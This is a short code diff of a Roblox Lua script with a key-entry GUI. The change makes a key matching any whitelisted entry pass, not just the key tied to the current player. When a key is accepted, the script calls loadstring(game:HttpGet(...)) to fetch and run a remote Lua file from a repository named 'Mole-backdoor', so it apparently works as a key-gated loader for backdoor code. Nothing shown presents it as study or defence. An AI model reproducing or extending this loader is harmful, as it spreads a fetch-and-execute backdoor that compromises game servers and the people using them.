@@ -40,10 +40,16 @@ btn.Parent = frame
 
 btn.MouseButton1Click:Connect(function()
     local input = box.Text
-    local playerName = game.Players.LocalPlayer.Name
+    local isValid = false
 
-    local userEntry = whitelisted[playerName]
-    if userEntry and input == userEntry.Key then
+    for _, userEntry in pairs(whitelisted) do
+        if input == userEntry.Key then
+            isValid = true
+            break
+        end
+    end
+
+    if isValid then
         gui:Destroy()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/TheTombstoneBackdoorOwner/Mole-backdoor/refs/heads/main/Mole.lua"))()
     else
